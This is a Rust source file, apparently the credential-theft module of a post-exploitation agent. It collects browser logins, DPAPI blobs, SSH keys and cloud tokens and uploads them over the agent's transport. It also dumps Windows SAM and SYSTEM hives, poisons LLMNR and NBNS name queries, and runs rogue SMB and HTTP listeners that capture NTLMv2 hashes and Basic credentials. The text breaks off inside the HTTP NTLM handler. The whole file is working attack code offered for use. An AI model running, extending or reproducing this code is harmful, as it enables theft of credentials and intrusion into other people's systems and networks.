//! Credential harvesting module — passive file-based collection, coerced auth,
//! SAM hive dump, and passive SMB listener for NTLMv2 capture.

use std::sync::{Arc, Mutex};
use crate::exec::AgentState;
use crate::transport::SharedTransport;

// ── Shared state for credential listeners ─────────────────────────────────────

/// Maximum NTLMv2 hashes to keep per listener ring buffer.
const LISTEN_MAX_HASHES: usize = 100;

/// Active listeners — multiple can run simultaneously (e.g. smb:8445 + http:80).
static LISTENERS: once_cell::sync::Lazy<Mutex<Vec<ListenerEntry>>> =
    once_cell::sync::Lazy::new(|| Mutex::new(Vec::new()));

/// Poisoner stop flag — shared across all listeners, started once.
static POISONER_STOP: once_cell::sync::Lazy<Mutex<Option<Arc<std::sync::atomic::AtomicBool>>>> =
    once_cell::sync::Lazy::new(|| Mutex::new(None));

static LLMNR_RESPONSES: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
static NBNS_RESPONSES:  std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

struct ListenerEntry {
    key:     String,          // "smb:445", "http:80", etc.
    port:    u16,
    proto:   String,
    started: std::time::Instant,
    stop:    Arc<std::sync::atomic::AtomicBool>,
    hashes:  Arc<Mutex<Vec<String>>>,
}

// ══════════════════════════════════════════════════════════════════════════════
// § HARVEST — passive file-based credential collection
// ══════════════════════════════════════════════════════════════════════════════

pub fn harvest(state: &Arc<AgentState>, transport: &SharedTransport) -> String {
    let mut out = String::new();
    let mut staged_count = 0u32;
    let mut staged_bytes = 0u64;

    #[cfg(windows)]
    {
        out.push_str("[creds harvest] Windows credential scan\n");

        // ── DPAPI blobs ──
        let appdata = std::env::var("APPDATA").unwrap_or_default();
        let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let userprofile = std::env::var("USERPROFILE").unwrap_or_default();

        // DPAPI credential blobs
        let dpapi_paths = [
            format!("{}\\Microsoft\\Credentials", appdata),
            format!("{}\\Microsoft\\Credentials", localappdata),
        ];
        for dir in &dpapi_paths {
            let (n, b) = _stage_dir_files(dir, "dpapi_cred", state, transport);
            if n > 0 {
                out.push_str(&format!("  ✓ DPAPI blobs ({}): {} files ({}) → staged\n", dir, n, _fmt_bytes(b)));
                staged_count += n;
                staged_bytes += b;
            }
        }

        // DPAPI master keys
        if let Some(sid) = _get_user_sid() {
            let mk_path = format!("{}\\Microsoft\\Protect\\{}", appdata, sid);
            let (n, b) = _stage_dir_files(&mk_path, "dpapi_mk", state, transport);
            if n > 0 {
                out.push_str(&format!("  ✓ DPAPI master keys: {} files ({}) → staged\n", n, _fmt_bytes(b)));
                staged_count += n;
                staged_bytes += b;
            }
        }

        // ── Browser credentials ──
        let chrome_path = format!("{}\\Google\\Chrome\\User Data\\Default\\Login Data", localappdata);
        if let Some(b) = _stage_file(&chrome_path, "chrome_logins.db", state, transport) {
            out.push_str(&format!("  ✓ Chrome Login Data: ({}) → staged\n", _fmt_bytes(b)));
            staged_count += 1; staged_bytes += b;
        } else {
            out.push_str("  ✗ Chrome: not found or not readable\n");
        }

        let edge_path = format!("{}\\Microsoft\\Edge\\User Data\\Default\\Login Data", localappdata);
        if let Some(b) = _stage_file(&edge_path, "edge_logins.db", state, transport) {
            out.push_str(&format!("  ✓ Edge Login Data: ({}) → staged\n", _fmt_bytes(b)));
            staged_count += 1; staged_bytes += b;
        }

        // Firefox
        let ff_dir = format!("{}\\Mozilla\\Firefox\\Profiles", appdata);
        let (n, b) = _stage_firefox(&ff_dir, state, transport);
        if n > 0 {
            out.push_str(&format!("  ✓ Firefox creds: {} files ({}) → staged\n", n, _fmt_bytes(b)));
            staged_count += n; staged_bytes += b;
        } else {
            out.push_str("  ✗ Firefox: not found\n");
        }

        // ── WiFi profiles ──
        let wifi = _harvest_wifi_windows();
        if !wifi.is_empty() {
            out.push_str(&format!("  ✓ WiFi profiles ({} chars) → inline\n", wifi.len()));
            out.push_str("  ─── WiFi ───\n");
            out.push_str(&wifi);
            out.push('\n');
        }

        // ── PuTTY sessions ──
        let putty = _harvest_putty();
        if !putty.is_empty() {
            out.push_str(&format!("  ✓ PuTTY sessions → inline\n"));
            out.push_str(&putty);
            out.push('\n');
        }

        // ── RDP files ──
        let rdp_dir = format!("{}\\Documents", userprofile);
        let (n, _) = _stage_glob(&rdp_dir, "*.rdp", "rdp", state, transport);
        if n > 0 { out.push_str(&format!("  ✓ RDP files: {} → staged\n", n)); staged_count += n; }

        // ── Windows Vault ──
        let vault_path = format!("{}\\Microsoft\\Vault", localappdata);
        let (n, b) = _stage_dir_files(&vault_path, "vault", state, transport);
        if n > 0 {
            out.push_str(&format!("  ✓ Windows Vault: {} files ({}) → staged\n", n, _fmt_bytes(b)));
            staged_count += n; staged_bytes += b;
        }
    }

    #[cfg(unix)]
    {
        out.push_str("[creds harvest] Linux credential scan\n");
        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());

        // ── SSH keys + config ──
        let ssh_dir = format!("{}/.ssh", home);
        let ssh_files = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
                         "id_rsa.pub", "id_ed25519.pub", "config", "known_hosts"];
        let mut ssh_n = 0u32;
        for f in &ssh_files {
            let p = format!("{}/{}", ssh_dir, f);
            if let Some(b) = _stage_file(&p, &format!("ssh_{}", f), state, transport) {
                ssh_n += 1; staged_bytes += b;
            }
        }
        // Also grab any key that matches id_* pattern
        if let Ok(entries) = std::fs::read_dir(&ssh_dir) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with("id_") && !ssh_files.contains(&name.as_str()) {
                    let p = entry.path().display().to_string();
                    if let Some(b) = _stage_file(&p, &format!("ssh_{}", name), state, transport) {
                        ssh_n += 1; staged_bytes += b;
                    }
                }
            }
        }
        if ssh_n > 0 {
            out.push_str(&format!("  ✓ SSH keys/config: {} files → staged\n", ssh_n));
            staged_count += ssh_n;
        } else {
            out.push_str("  ✗ SSH: no keys found\n");
        }

        // ── Kerberos ccache ──
        let krb_path = std::env::var("KRB5CCNAME")
            .unwrap_or_else(|_| format!("/tmp/krb5cc_{}", _get_uid()));
        let krb_path = krb_path.trim_start_matches("FILE:").to_string();
        if let Some(b) = _stage_file(&krb_path, "krb5_ccache", state, transport) {
            out.push_str(&format!("  ✓ Kerberos ccache: ({}) → staged\n", _fmt_bytes(b)));
            staged_count += 1; staged_bytes += b;
        }

        // ── Git credentials ──
        let git_paths = [
            format!("{}/.git-credentials", home),
            format!("{}/.config/git/credentials", home),
        ];
        for p in &git_paths {
            if let Some(b) = _stage_file(p, "git_credentials", state, transport) {
                out.push_str(&format!("  ✓ Git creds: {} ({}) → staged\n", p, _fmt_bytes(b)));
                staged_count += 1; staged_bytes += b;
            }
        }

        // ── Cloud credentials ──
        let cloud_files = [
            (format!("{}/.aws/credentials", home), "aws_credentials"),
            (format!("{}/.azure/msal_token_cache.json", home), "azure_token_cache"),
            (format!("{}/.config/gcloud/credentials.db", home), "gcloud_creds"),
            (format!("{}/.docker/config.json", home), "docker_config"),
            (format!("{}/.kube/config", home), "kube_config"),
        ];
        for (path, label) in &cloud_files {
            if let Some(b) = _stage_file(path, label, state, transport) {
                out.push_str(&format!("  ✓ {}: ({}) → staged\n", label, _fmt_bytes(b)));
                staged_count += 1; staged_bytes += b;
            }
        }

        // ── GNOME Keyring ──
        let keyring_dir = format!("{}/.local/share/keyrings", home);
        let (n, b) = _stage_dir_files(&keyring_dir, "keyring", state, transport);
        if n > 0 {
            out.push_str(&format!("  ✓ GNOME keyring: {} files ({}) → staged\n", n, _fmt_bytes(b)));
            staged_count += n; staged_bytes += b;
        }

        // ── NetworkManager (needs root) ──
        let nm_dir = "/etc/NetworkManager/system-connections";
        let (n, b) = _stage_dir_files(nm_dir, "nm_wifi", state, transport);
        if n > 0 {
            out.push_str(&format!("  ✓ NetworkManager WiFi: {} profiles ({}) → staged\n", n, _fmt_bytes(b)));
            staged_count += n; staged_bytes += b;
        }

        // ── SSSD cache (needs root) ──
        let sssd_dir = "/var/lib/sss/db";
        let (n, b) = _stage_glob(sssd_dir, "cache_*.ldb", "sssd", state, transport);
        if n > 0 {
            out.push_str(&format!("  ✓ SSSD cache: {} files ({}) → staged\n", n, _fmt_bytes(b)));
            staged_count += n; staged_bytes += b;
        }

        // ── History grep for secrets ──
        let hist_secrets = _grep_history_secrets(&home);
        if !hist_secrets.is_empty() {
            out.push_str(&format!("  ✓ History secrets: {} lines → inline\n", hist_secrets.lines().count()));
            out.push_str("  ─── History (password/token/key matches) ───\n");
            // Cap inline output
            let capped: String = hist_secrets.lines().take(50).collect::<Vec<_>>().join("\n");
            out.push_str(&capped);
            out.push('\n');
        }
    }

    out.push_str(&format!("\n  Artifacts staged: {} files ({} total)\n", staged_count, _fmt_bytes(staged_bytes)));
    out
}

// ══════════════════════════════════════════════════════════════════════════════
// § COERCE — forced local authentication to capture hashes/credentials
// ══════════════════════════════════════════════════════════════════════════════

pub fn coerce() -> String {
    let mut out = String::new();

    #[cfg(windows)]
    {
        out.push_str("[creds coerce] Named pipe coercion\n");
        match _coerce_spoolsample_local() {
            Ok(hash) => {
                out.push_str("  ✓ SpoolSample (MS-RPRN) local coercion succeeded\n");
                out.push_str("  ✓ NetNTLMv2 captured:\n\n");
                out.push_str(&hash);
                out.push_str("\n\n  Format: NetNTLMv2 (hashcat -m 5600)\n");
            }
            Err(e) => {
                out.push_str(&format!("  ✗ SpoolSample failed: {}\n", e));
                // Fallback: try EfsRpc
                match _coerce_efsrpc_local() {
                    Ok(hash) => {
                        out.push_str("  ✓ EfsRpc (MS-EFSR) local coercion succeeded\n");
                        out.push_str("  ✓ NetNTLMv2 captured:\n\n");
                        out.push_str(&hash);
                        out.push_str("\n\n  Format: NetNTLMv2 (hashcat -m 5600)\n");
                    }
                    Err(e2) => {
                        out.push_str(&format!("  ✗ EfsRpc failed: {}\n", e2));
                        out.push_str("  No coercion method succeeded.\n");
                    }
                }
            }
        }
    }

    #[cfg(unix)]
    {
        out.push_str("[creds coerce] SSH agent hijack + Kerberos\n");

        // ── SSH Agent Hijack ──
        let agents = _find_ssh_agents();
        if agents.is_empty() {
            out.push_str("  ✗ No SSH agents found\n");
        } else {
            out.push_str(&format!("  SSH agents found: {}\n", agents.len()));
            for agent in &agents {
                out.push_str(&format!("    ✓ user={} pid={} sock={}\n", agent.user, agent.pid, agent.sock));
                match _ssh_agent_list_keys(&agent.sock) {
                    Ok(keys) => {
                        out.push_str(&format!("      Keys: {}\n", keys.len()));
                        for k in &keys {
                            out.push_str(&format!("        {} {}\n", k.key_type, k.comment));
                        }
                        out.push_str("      Agent usable: yes\n");
                    }
                    Err(e) => out.push_str(&format!("      Error listing keys: {}\n", e)),
                }
            }
        }

        // ── Kerberos ccache check ──
        let krb_path = std::env::var("KRB5CCNAME")
            .unwrap_or_else(|_| format!("/tmp/krb5cc_{}", _get_uid()));
        let krb_path = krb_path.trim_start_matches("FILE:").to_string();
        if std::path::Path::new(&krb_path).exists() {
            if let Ok(meta) = std::fs::metadata(&krb_path) {
                out.push_str(&format!("  ✓ Kerberos ccache: {} ({} bytes)\n", krb_path, meta.len()));
                out.push_str("    (already staged by /creds harvest if run)\n");
            }
        } else {
            out.push_str("  ✗ No Kerberos ccache found\n");
        }
    }

    out
}

// ══════════════════════════════════════════════════════════════════════════════
// § SAM — Windows SAM/SYSTEM/SECURITY hive dump (requires SYSTEM)
// ══════════════════════════════════════════════════════════════════════════════

pub fn sam(_state: &Arc<AgentState>, _transport: &SharedTransport) -> String {
    #[cfg(unix)]
    {
        return "[creds sam] This command is Windows-only. Use 'cat /etc/shadow' from shell on Linux.".to_string();
    }

    #[cfg(windows)]
    {
        let mut out = String::from("[creds sam] SAM/SYSTEM/SECURITY hive dump\n");

        // Check privilege
        if !_is_system_or_admin() {
            out.push_str("  ✗ Error: requires SYSTEM or elevated Administrator privileges\n");
            out.push_str("  Hint: run from a SYSTEM-level persistence or use token elevation\n");
            return out;
        }

        out.push_str("  Privilege: elevated ✓\n");

        // Try reg save first
        let temp = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
        let hives = [
            ("SAM",      format!("{}\\s_{}.tmp", temp, _rand_hex(4))),
            ("SYSTEM",   format!("{}\\y_{}.tmp", temp, _rand_hex(4))),
            ("SECURITY", format!("{}\\e_{}.tmp", temp, _rand_hex(4))),
        ];

        let mut success = true;
        out.push_str("  Method: reg save\n");

        for (name, path) in &hives {
            let cmd = format!("reg save HKLM\\{} {} /y", name, path);
            let result = std::process::Command::new("cmd")
                .args(["/C", &cmd])
                .output();
            match result {
                Ok(o) if o.status.success() => {}
                _ => { success = false; break; }
            }
        }

        if !success {
            // Fallback: VSS
            out.push_str("  reg save failed — trying Volume Shadow Copy...\n");
            // Simplified VSS approach: use wmic
            let vss_result = std::process::Command::new("cmd")
                .args(["/C", "wmic shadowcopy call create Volume=C:\\"])
                .output();
            if let Ok(o) = vss_result {
                if o.status.success() {
                    // Get shadow copy path
                    if let Ok(list_out) = std::process::Command::new("cmd")
                        .args(["/C", "wmic shadowcopy get DeviceObject /value"])
                        .output()
                    {
                        let list_str = String::from_utf8_lossy(&list_out.stdout);
                        if let Some(dev) = list_str.lines()
                            .filter(|l| l.starts_with("DeviceObject="))
                            .last()
                        {
                            let shadow_path = dev.trim_start_matches("DeviceObject=").trim();
                            let src_paths = [
                                format!("{}\\Windows\\System32\\config\\SAM", shadow_path),
                                format!("{}\\Windows\\System32\\config\\SYSTEM", shadow_path),
                                format!("{}\\Windows\\System32\\config\\SECURITY", shadow_path),
                            ];
                            for (i, src) in src_paths.iter().enumerate() {
                                let _ = std::fs::copy(src, &hives[i].1);
                            }
                            success = true;
                        }
                    }
                }
            }
            if !success {
                out.push_str("  ✗ Both reg save and VSS failed\n");
                return out;
            }
            out.push_str("  VSS fallback succeeded\n");
        }

        // Stage the hive files
        for (name, path) in &hives {
            match std::fs::read(path) {
                Ok(data) => {
                    let staging_dest = format!("{}/staging/creds_{}_{}.hiv",
                        _state.folder_path.trim_end_matches('/'), name.to_lowercase(), _rand_hex(4));
                    if _transport.upload(&staging_dest, &data) {
                        out.push_str(&format!("  ✓ {} → staged ({})\n", name, _fmt_bytes(data.len() as u64)));
                    } else {
                        out.push_str(&format!("  ✗ {} upload failed\n", name));
                    }
                }
                Err(e) => out.push_str(&format!("  ✗ {} read error: {}\n", name, e)),
            }
            // Clean up temp file
            let _ = std::fs::remove_file(path);
        }

        out.push_str("\n  Crack offline:\n");
        out.push_str("    secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL\n");
        out
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// § LISTEN — multi-protocol credential listeners (SMB / HTTP-NTLM)
// ══════════════════════════════════════════════════════════════════════════════

pub fn listen_start(port: u16, proto: &str) -> String {
    let proto = if proto.is_empty() || proto == "all" { "smb" } else { proto };
    let key = format!("{}:{}", proto, port);

    // Check for duplicate
    {
        let guard = LISTENERS.lock().unwrap();
        if guard.iter().any(|e| e.key == key) {
            return format!("[creds listen] {} already running", key);
        }
    }

    let stop_flag = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let hashes: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    let mut active: Vec<String> = Vec::new();
    let mut failed: Vec<String> = Vec::new();

    // Main protocol listener (TCP)
    let bind_addr = format!("0.0.0.0:{}", port);
    match std::net::TcpListener::bind(&bind_addr) {
        Ok(listener) => {
            listener.set_nonblocking(true).ok();
            let stop_tcp = stop_flag.clone();
            let hashes_ref = hashes.clone();
            match proto {
                "http" => {
                    std::thread::spawn(move || { _http_ntlm_listener_loop(listener, stop_tcp, hashes_ref); });
                    active.push(format!("HTTP-NTLM:{}", port));
                }
                _ => {
                    std::thread::spawn(move || { _smb_listener_loop(listener, stop_tcp, hashes_ref); });
                    active.push(format!("SMB:{}", port));
                }
            }
        }
        Err(e) => {
            failed.push(format!("{}:{} ({})", proto.to_uppercase(), port, e));
        }
    }

    if active.is_empty() {
        return format!("[creds listen] Failed to bind {}:{} — {}", proto, port, failed.join(", "));
    }

    // Add entry
    {
        let mut guard = LISTENERS.lock().unwrap();
        guard.push(ListenerEntry {
            key: key.clone(),
            port,
            proto: proto.to_string(),
            started: std::time::Instant::now(),
            stop: stop_flag,
            hashes,
        });
    }

    // Start poisoners if not already running
    _ensure_poisoners(&mut active, &mut failed);

    let mut msg = format!("[creds listen] Active: {}", active.join(" + "));
    if !failed.is_empty() {
        msg.push_str(&format!("\n  Skipped: {}", failed.join(", ")));
    }
    msg
}

/// Start LLMNR/NBNS poisoners if not already running.
fn _ensure_poisoners(active: &mut Vec<String>, failed: &mut Vec<String>) {
    let mut pguard = POISONER_STOP.lock().unwrap();
    if pguard.is_some() { return; } // Already running

    let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));

    let stop_llmnr = stop.clone();
    if std::net::UdpSocket::bind("0.0.0.0:5355").is_ok() {
        std::thread::spawn(move || { _llmnr_poisoner_loop(stop_llmnr); });
        active.push("LLMNR:5355".to_string());
    } else {
        failed.push("LLMNR:5355 (in use)".to_string());
    }

    let stop_nbns = stop.clone();
    if std::net::UdpSocket::bind("0.0.0.0:137").is_ok() {
        std::thread::spawn(move || { _nbns_poisoner_loop(stop_nbns); });
        active.push("NBNS:137".to_string());
    } else {
        failed.push("NBNS:137 (in use)".to_string());
    }

    *pguard = Some(stop);
}

/// Stop poisoners if no listeners remain.
fn _stop_poisoners_if_empty() {
    let guard = LISTENERS.lock().unwrap();
    if !guard.is_empty() { return; }
    drop(guard);
    let mut pguard = POISONER_STOP.lock().unwrap();
    if let Some(stop) = pguard.take() {
        stop.store(true, std::sync::atomic::Ordering::Relaxed);
    }
    LLMNR_RESPONSES.store(0, std::sync::atomic::Ordering::Relaxed);
    NBNS_RESPONSES.store(0, std::sync::atomic::Ordering::Relaxed);
}

pub fn listen_stop(spec: &str) -> String {
    if spec.is_empty() {
        // Stop ALL listeners + poisoners
        let mut guard = LISTENERS.lock().unwrap();
        if guard.is_empty() {
            return "[creds listen] No listeners running.".to_string();
        }
        let mut total_hashes = 0usize;
        for entry in guard.iter() {
            entry.stop.store(true, std::sync::atomic::Ordering::Relaxed);
            total_hashes += entry.hashes.lock().map(|h| h.len()).unwrap_or(0);
        }
        let count = guard.len();
        guard.clear();
        drop(guard);
        let mut pguard = POISONER_STOP.lock().unwrap();
        if let Some(stop) = pguard.take() {
            stop.store(true, std::sync::atomic::Ordering::Relaxed);
        }
        let llmnr = LLMNR_RESPONSES.swap(0, std::sync::atomic::Ordering::Relaxed);
        let nbns  = NBNS_RESPONSES.swap(0, std::sync::atomic::Ordering::Relaxed);
        format!("[creds listen] Stopped {} listener(s). {} credentials captured. Poisoned: {} LLMNR, {} NBNS.",
            count, total_hashes, llmnr, nbns)
    } else {
        // Stop a specific listener by key (e.g. "http:80")
        let mut guard = LISTENERS.lock().unwrap();
        let idx = guard.iter().position(|e| e.key == spec);
        match idx {
            Some(i) => {
                let entry = guard.remove(i);
                entry.stop.store(true, std::sync::atomic::Ordering::Relaxed);
                let n = entry.hashes.lock().map(|h| h.len()).unwrap_or(0);
                let elapsed = entry.started.elapsed();
                drop(guard);
                _stop_poisoners_if_empty();
                format!("[creds listen] Stopped {}. Was active for {}. {} credentials captured.",
                    spec, _fmt_duration(elapsed), n)
            }
            None => {
                let running: Vec<&str> = guard.iter().map(|e| e.key.as_str()).collect();
                if running.is_empty() {
                    "[creds listen] No listeners running.".to_string()
                } else {
                    format!("[creds listen] '{}' not found. Running: {}", spec, running.join(", "))
                }
            }
        }
    }
}

pub fn listen_dump() -> String {
    let guard = LISTENERS.lock().unwrap();
    if guard.is_empty() {
        return "[creds listen] No listeners running. Use '/creds listen start' first.".to_string();
    }

    let llmnr = LLMNR_RESPONSES.load(std::sync::atomic::Ordering::Relaxed);
    let nbns  = NBNS_RESPONSES.load(std::sync::atomic::Ordering::Relaxed);
    let mut out = String::new();
    let mut has_ntlm = false;

    for entry in guard.iter() {
        let elapsed = entry.started.elapsed();
        let hashes = entry.hashes.lock().unwrap();
        let label = entry.key.to_uppercase();

        if hashes.is_empty() {
            out.push_str(&format!("[{}] 0 credentials (active {})\n", label, _fmt_duration(elapsed)));
        } else {
            let basic_count = hashes.iter().filter(|h| h.starts_with("[HTTP-Basic]")).count();
            let ntlm_count = hashes.len() - basic_count;
            if ntlm_count > 0 { has_ntlm = true; }
            out.push_str(&format!("[{}] {} credentials (active {}) — {} NTLMv2 + {} Basic\n",
                label, hashes.len(), _fmt_duration(elapsed), ntlm_count, basic_count));
            for h in hashes.iter() {
                out.push_str("  ");
                out.push_str(h);
                out.push('\n');
            }
        }
    }

    out.push_str(&format!("\nPoisoned: {} LLMNR, {} NBNS responses", llmnr, nbns));
    if has_ntlm {
        out.push_str("\nNTLMv2 format: hashcat -m 5600");
    }
    out
}

// ══════════════════════════════════════════════════════════════════════════════
// § LLMNR POISONER — respond to multicast name queries with our IP
// ══════════════════════════════════════════════════════════════════════════════

fn _llmnr_poisoner_loop(stop: Arc<std::sync::atomic::AtomicBool>) {
    use std::net::{UdpSocket, Ipv4Addr};
    use std::time::Duration;

    // LLMNR multicast: 224.0.0.252 port 5355
    let sock = match UdpSocket::bind("0.0.0.0:5355") {
        Ok(s) => s,
        Err(_) => return, // Can't bind (already in use or no perms)
    };
    sock.set_read_timeout(Some(Duration::from_millis(500))).ok();
    // Join multicast group
    let multicast = Ipv4Addr::new(224, 0, 0, 252);
    let _ = sock.join_multicast_v4(&multicast, &Ipv4Addr::UNSPECIFIED);

    let local_ip = _get_local_ip_bytes();

    while !stop.load(std::sync::atomic::Ordering::Relaxed) {
        let mut buf = [0u8; 512];
        let (n, src) = match sock.recv_from(&mut buf) {
            Ok(r) => r,
            Err(_) => continue,
        };
        if n < 12 { continue; }

        // LLMNR query format: standard DNS-like header
        // Flags at bytes 2-3: QR=0 means query
        if buf[2] & 0x80 != 0 { continue; } // Skip responses
        let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
        if qdcount == 0 { continue; }

        // Parse the query name (starts at byte 12)
        let (name, name_end) = match _parse_dns_name(&buf[12..n]) {
            Some(r) => r,
            None => continue,
        };
        let name_end = name_end + 12;

        // Build response: same transaction ID, QR=1, answer with our IP
        let mut resp = Vec::with_capacity(n + 16);
        // Copy header — set QR=1 (response), ANCOUNT=1
        resp.extend_from_slice(&buf[..2]); // Transaction ID
        resp.push(0x80); resp.push(0x00);  // Flags: QR=1, no error
        resp.extend_from_slice(&buf[4..6]); // QDCOUNT (copy)
        resp.push(0x00); resp.push(0x01);   // ANCOUNT = 1
        resp.push(0x00); resp.push(0x00);   // NSCOUNT
        resp.push(0x00); resp.push(0x00);   // ARCOUNT
        // Copy question section
        resp.extend_from_slice(&buf[12..name_end + 4]); // name + type + class
        // Answer section: name pointer + type A + class IN + TTL + RDLEN + IP
        resp.push(0xC0); resp.push(0x0C);   // Name pointer to offset 12
        resp.push(0x00); resp.push(0x01);   // Type A
        resp.push(0x00); resp.push(0x01);   // Class IN
        resp.extend_from_slice(&30u32.to_be_bytes()); // TTL 30s
        resp.push(0x00); resp.push(0x04);   // RDLENGTH = 4
        resp.extend_from_slice(&local_ip);  // Our IP

        let _ = sock.send_to(&resp, src);

        // Update stats
        LLMNR_RESPONSES.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        let _ = name; // used for future logging
    }
    let _ = sock.leave_multicast_v4(&multicast, &Ipv4Addr::UNSPECIFIED);
}

// ══════════════════════════════════════════════════════════════════════════════
// § NBNS POISONER — respond to NetBIOS name queries with our IP
// ══════════════════════════════════════════════════════════════════════════════

fn _nbns_poisoner_loop(stop: Arc<std::sync::atomic::AtomicBool>) {
    use std::net::UdpSocket;
    use std::time::Duration;

    // NBNS: UDP port 137
    let sock = match UdpSocket::bind("0.0.0.0:137") {
        Ok(s) => s,
        Err(_) => return, // Can't bind
    };
    sock.set_read_timeout(Some(Duration::from_millis(500))).ok();
    sock.set_broadcast(true).ok();

    let local_ip = _get_local_ip_bytes();

    while !stop.load(std::sync::atomic::Ordering::Relaxed) {
        let mut buf = [0u8; 512];
        let (n, src) = match sock.recv_from(&mut buf) {
            Ok(r) => r,
            Err(_) => continue,
        };
        if n < 50 { continue; }

        // NBNS header: same as DNS
        // Flags: byte 2-3, opcode in bits 11-14 of flags
        let flags = u16::from_be_bytes([buf[2], buf[3]]);
        let qr     = (flags >> 15) & 1;
        let opcode = (flags >> 11) & 0xF;
        if qr != 0 { continue; }  // Skip responses
        if opcode != 0 { continue; } // Only handle name queries (opcode 0)
        let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
        if qdcount == 0 { continue; }

        // NBNS name starts at byte 12: length-prefixed NetBIOS encoded name
        // Format: 0x20 (length=32) followed by 32 bytes of encoded name, then 0x00
        if buf[12] != 0x20 { continue; }
        if n < 12 + 1 + 32 + 1 + 4 { continue; } // name + null + type/class

        // Build NBNS positive name query response
        let mut resp = Vec::with_capacity(62);
        resp.extend_from_slice(&buf[..2]); // Transaction ID
        // Flags: QR=1, opcode=0, AA=1, TC=0, RD=1, RA=0, B=0, rcode=0
        resp.push(0x85); resp.push(0x00);
        resp.push(0x00); resp.push(0x00); // QDCOUNT = 0
        resp.push(0x00); resp.push(0x01); // ANCOUNT = 1
        resp.push(0x00); resp.push(0x00); // NSCOUNT
        resp.push(0x00); resp.push(0x00); // ARCOUNT
        // Answer: copy the name from the query (34 bytes: 0x20 + 32 encoded + 0x00)
        resp.extend_from_slice(&buf[12..12 + 34]);
        resp.push(0x00); resp.push(0x20); // Type: NB (0x0020)
        resp.push(0x00); resp.push(0x01); // Class: IN
        resp.extend_from_slice(&300u32.to_be_bytes()); // TTL 300s
        resp.push(0x00); resp.push(0x06); // RDLENGTH = 6
        // NB_FLAGS: B-node, unique
        resp.push(0x00); resp.push(0x00);
        resp.extend_from_slice(&local_ip); // Our IP

        let _ = sock.send_to(&resp, src);

        // Update stats
        NBNS_RESPONSES.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    }
}

// ── Poisoner helpers ─────────────────────────────────────────────────────────

/// Parse a DNS-style name from a buffer. Returns (name_string, bytes_consumed).
fn _parse_dns_name(data: &[u8]) -> Option<(String, usize)> {
    let mut name = String::new();
    let mut i = 0;
    loop {
        if i >= data.len() { return None; }
        let len = data[i] as usize;
        if len == 0 { i += 1; break; }
        if len >= 0xC0 { return None; } // Compression pointers not expected in queries
        i += 1;
        if i + len > data.len() { return None; }
        if !name.is_empty() { name.push('.'); }
        name.push_str(&String::from_utf8_lossy(&data[i..i + len]));
        i += len;
    }
    Some((name, i))
}

/// Get the local IPv4 address as 4 bytes for embedding in responses.
fn _get_local_ip_bytes() -> [u8; 4] {
    let ip_str = crate::sysinfo::local_ip();
    let parts: Vec<&str> = ip_str.split('.').collect();
    if parts.len() == 4 {
        let mut octets = [0u8; 4];
        for (i, p) in parts.iter().enumerate() {
            octets[i] = p.parse().unwrap_or(0);
        }
        octets
    } else {
        [127, 0, 0, 1]
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// § HTTP NTLM LISTENER — captures NTLMv2 via HTTP 401 + WWW-Authenticate
// ══════════════════════════════════════════════════════════════════════════════

fn _http_ntlm_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync::atomic::AtomicBool>, hashes: Arc<Mutex<Vec<String>>>) {
    use std::time::Duration;

    while !stop.load(std::sync::atomic::Ordering::Relaxed) {
        match listener.accept() {
            Ok((mut stream, addr)) => {
                stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
                stream.set_write_timeout(Some(Duration::from_secs(10))).ok();
                let peer = addr.ip().to_string();

                if let Some(cred) = _handle_http_ntlm_client(&mut stream, &peer) {
                    if let Ok(mut h) = hashes.lock() {
                        if h.len() >= LISTEN_MAX_HASHES { h.remove(0); }
                        h.push(cred);
                    }
                }
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(Duration::from_millis(500));
            }
            Err(_) => {
                std::thread::sleep(Duration::from_millis(100));
            }
        }
    }
}

/// Handle a single HTTP client — captures NTLMv2 hashes AND Basic auth credentials.
/// Advertises both NTLM and Basic; NTLM is preferred by Windows browsers.
fn _handle_http_ntlm_client(stream: &mut std::net::TcpStream, peer: &str) -> Option<String> {
    use std::io::{Read, Write};

    let challenge = _random_challenge();

    // Read first request
    let req1 = _http_read_request(stream)?;

    // Check for Basic auth first (some clients send it immediately)
    if let Some(cred) = _http_extract_basic(&req1, peer) {
        _http_send_200(stream);
        return Some(cred);
    }

    let auth1 = _http_extract_ntlm(&req1);

    match auth1 {
        None => {
            // Step 1: No auth → send 401 requesting NTLM + Basic
            _http_send_401(stream, None)?;

            // Read second request
            let req2 = _http_read_request(stream)?;

            // Check Basic auth (user entered creds in the prompt)
            if let Some(cred) = _http_extract_basic(&req2, peer) {
                _http_send_200(stream);
                return Some(cred);
            }

            // Otherwise expect NTLM Type1
            let type1_b64 = _http_extract_ntlm(&req2)?;
            let type1_bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, type1_b64.trim()).ok()?;

            // Verify it's NTLMSSP NEGOTIATE (Type1)
            if !type1_bytes.starts_with(b"NTLMSSP\x00") { return None; }
            if type1_bytes.len() < 12 { return None; }
            let msg_type = u32::from_le_bytes([type1_bytes[8], type1_bytes[9], type1_bytes[10], type1_bytes[11]]);
            if msg_type != 1 { return None; }

            // Step 2: Send 401 + Type2 challenge
            let type2 = _build_ntlmssp_challenge(&challenge);
            let type2_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &type2);
            _http_send_401(stream, Some(&type2_b64))?;

            // Read third request (should have Type3 with hash)
            let req3 = _http_read_request(stream)?;
